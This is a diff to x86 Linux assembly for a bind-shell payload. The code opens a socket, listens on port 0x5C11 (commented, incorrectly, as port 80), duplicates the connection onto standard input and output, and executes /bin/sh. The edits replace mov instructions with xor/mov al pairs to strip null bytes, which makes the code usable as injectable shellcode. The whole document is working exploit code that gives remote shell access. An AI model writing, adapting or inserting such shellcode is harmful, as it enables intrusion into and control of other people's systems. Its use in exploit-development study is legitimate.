@@ -4,8 +4,8 @@ section .text
 _start:  
 
 ;    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
-
-	mov    eax,0x66	;socket sys
+	xor    eax,eax
+	mov    al,0x66	;socket sys
 	xor    edx,edx	
 	push   edx	;->
  	inc    edx	;edx=1
@@ -26,7 +26,7 @@ _start:
 	inc    ebx	;ebx=2
 	xor    edx,edx	;edx=0
 	push   edx	;-> INADDR_ANY
-	push   word  0x5000;-> port 80 
+	push   word  0x5C11;-> port 80 
 	push   bx	;->Value of 2
 	mov    ecx,esp	
 ;-----------------------------------
@@ -37,12 +37,13 @@ _start:
 	push   ecx	;-> [parameter of structure's &hostaddr]
 	push   esi	;-> 
 	mov    ecx,esp	;move parameter into ecx register
-	mov    eax,0x66	; socket syscall
+	xor    eax,eax
+	mov    al,0x66	; socket syscall
 	int    0x80	; syscall
 
 ;    listen(host_sockid, 2);  
-
-	mov    eax,0x66 ; socket syscall
+	xor    eax,eax
+	mov    al,0x66 ; socket syscall
 	push   ebx	;->
 	inc    ebx	;ebx=3
 	inc    ebx	;ebx=4
@@ -59,7 +60,8 @@ _start:
 	push   esi	;->
 	mov    ecx,esp	
 	inc    ebx	;ebx=5 || accept
-	mov    eax,0x66	;socket syscall
+	xor    eax,eax
+	mov    al,0x66	;socket syscall
 	int    0x80	;syscall
 
 ;    dup2(client_sockid, 0);  
@@ -69,6 +71,7 @@ _start:
 	xor    ecx,ecx	;ecx=0
 	mov    ebx,eax	;ebx= newsocket_value
 loop:
+	xor    eax,eax
 	mov al, 0x3f	;dup2
 	int 0x80	;syscall
 	inc ecx		;1,2,....
@@ -76,8 +79,9 @@ loop:
 	jne loop	; loop back
 
 ;execve("/bin/sh", NULL, NULL);  
-	
-	mov eax,0xb	;execve syscall
+
+	xor    eax,eax
+	mov al,0xb	;execve syscall
 	xor edx,edx	;edx =0
 	push edx	;->
 	push 0x68732f2f	;hs//		->
@@ -87,3 +91,4 @@ loop:
 	mov ecx, edx
 	
 	int 0x80
+
